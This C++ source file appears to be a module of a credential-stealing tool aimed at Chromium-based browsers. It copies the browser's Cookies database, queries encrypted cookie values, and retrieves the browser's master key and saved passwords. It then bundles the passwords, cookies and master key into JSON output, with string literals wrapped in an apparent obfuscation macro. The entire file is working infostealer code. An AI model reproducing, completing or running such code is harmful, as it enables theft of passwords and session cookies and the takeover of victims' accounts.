#include "Chromium.h"

Tool::Browsers::Chromium::Chromium(Tool::Configuration::config_t MainContext_t) :Browser(MainContext_t){
	this->sPasswordsBuffer = STR("{ \"Passwords\": {");
	this->sCookiesBuffer = STR("{\"Cookies\": [");
}

void Tool::Browsers::Chromium::GetUserPasswords(awesomejson::json& jFinalCredentials)
{
	std::string sFinalCredentials;
	if (!this->GatherCredentialsFromDB())
	{
		Tool::Utils::print_error(STR("Browser is not installed or not accessible"));
		return;
	}
	if (!this->sPasswordsBuffer.ends_with('{'))
		Tool::Utils::CleanExtraFromJson(this->sPasswordsBuffer);
	sFinalCredentials = this->sPasswordsBuffer + "}}";
	jFinalCredentials = awesomejson::json::parse(sFinalCredentials);
}

void Tool::Browsers::Chromium::GetUserCookies(awesomejson::json& jChromeCookies)
{
	// Copy Cookies database file
	std::string sCopiedDbFile;
	std::string sCookiesDbFile = std::format(STR("{}\\Default\\Cookies"), this->sBrowserRootPath);
	this->CopyBrowserFileToProducts(sCookiesDbFile, sCopiedDbFile);
	if (sCopiedDbFile.empty()) return;
	sqlite3* db = Tool::Browsers::ChromiumDecrypt::OpenDatabase(sCopiedDbFile);
	if (db == NULL) return;
	std::string query = STR("SELECT host_key, encrypted_value FROM cookies");
	if (Tool::Browsers::ChromiumDecrypt::ExecuteSqlCommand(db, &query[0], *this, false)) {
		if (!this->sCookiesBuffer.ends_with('['))
			Tool::Utils::CleanExtraFromJson(this->sCookiesBuffer);
		this->sCookiesBuffer += "]}";
		jChromeCookies = awesomejson::json::parse(this->sCookiesBuffer);
	}
	sqlite3_close(db);
}

void Tool::Browsers::Chromium::ExecuteAllModules(awesomejson::json& jFinalResults, Tool::Browsers::Browser& BrowserType)
{
	awesomejson::json jPasswords = awesomejson::json({});
	awesomejson::json jCookies = awesomejson::json({});
	this->GetUserPasswords(jPasswords);
	(jPasswords != NULL) ? 
		Tool::Utils::print(std::format(STR("Retrieved {} passwords"), BrowserType.sBrowserIdentifier)) : 
		Tool::Utils::print_error(std::format(STR("Unable to retrieve passwords"), BrowserType.sBrowserIdentifier));
	this->GetUserCookies(jCookies);
	(jCookies != NULL) ?
		Tool::Utils::print(std::format(STR("Retrieved {} cookies"), BrowserType.sBrowserIdentifier)) :
		Tool::Utils::print_error(std::format(STR("Unable to retrieve {} cookies"), BrowserType.sBrowserIdentifier));
	jFinalResults.merge_patch(jPasswords);
	jFinalResults.merge_patch(jCookies);
	awesomejson::json jMasterKey = awesomejson::json::parse("{\"" + BrowserType.sBrowserIdentifier + STR("-Masterkey\": \"") + this->sMasterKey + "\"}");
	jFinalResults.merge_patch(jMasterKey);
}


bool Tool::Browsers::Chromium::GatherCredentialsFromDB()
{
	Tool::Browsers::ChromiumDecrypt::RetrieveMasterKey(this->sMasterKey, this);
	Tool::Browsers::ChromiumDecrypt::RetrievePasswords(this);
	return true;
}
